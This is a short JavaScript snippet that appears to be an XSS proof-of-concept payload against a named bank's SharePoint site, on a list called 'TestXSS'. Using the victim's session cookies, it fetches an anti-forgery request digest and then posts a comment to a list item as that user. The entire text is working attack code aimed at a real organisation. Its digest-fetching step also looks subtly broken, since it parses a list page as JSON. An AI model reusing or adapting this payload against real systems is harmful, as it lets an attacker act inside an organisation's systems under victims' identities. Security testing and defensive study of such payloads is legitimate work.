(function() {
  const GET_DIGEST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx'; 
  const POST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';      

  function sendPost(digest) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', POST_URL, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('X-Requestdigest', digest);
    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
    xhr.send(JSON.stringify({ text: "-----23-----", mentions: [] }));
  }

  var xhr = new XMLHttpRequest();
  xhr.open('GET', GET_DIGEST_URL, true);
  xhr.withCredentials = true;
  xhr.onload = function() {
    if (xhr.status === 200) {
      try {
        var json = JSON.parse(xhr.responseText);
        var digest = json.FormDigestValue || (json.d && json.d.GetContextWebInformation && json.d.GetContextWebInformation.FormDigestValue);
        if (digest) sendPost(digest);
      } catch(e) {}
    }
  };
  xhr.send();
})();
